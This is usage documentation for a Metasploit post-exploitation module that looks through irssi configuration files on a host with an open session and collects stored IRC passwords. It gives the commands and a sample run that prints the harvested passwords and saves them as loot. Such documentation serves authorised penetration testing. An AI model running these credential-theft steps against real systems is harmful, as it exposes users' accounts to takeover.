## Vulnerable Application

[irssi](https://irssi.org/) an IRC and chat client.

This module was successfully tested against:

- OSX 10.10.5 and IRSSI version 0.8.19

## Verification Steps

  1. Get a `shell` or `meterpreter` session on some host.
  2. Do: ```use post/multi/gather/irssi_creds```
  3. Do: ```set SESSION [SESSION_ID]```
  4. Do: ```run```
  5. If the system has readable configuration files containing irc passwords, they will be printed out.

## Scenarios

### OSX 10.10.5 and IRSSI version 0.8.19

```
msf post(irssi_creds) > run

msf post(irssi_creds) > run

[*] Finding ~/.irssi/config
[*] Looting 1 files
[+] Found a IRC password(s): chubbybunnies,meatpopcicle
[+] IRC password(s) stored in /Users/jclaudius/.msf4/loot/20170410153351_default_192.168.10.99_irc.password_159907.txt
[+] IRC password(s) stored in /Users/jclaudius/.msf4/loot/20170410153351_default_192.168.10.99_irc.password_967698.txt
[*] Post module execution completed
```
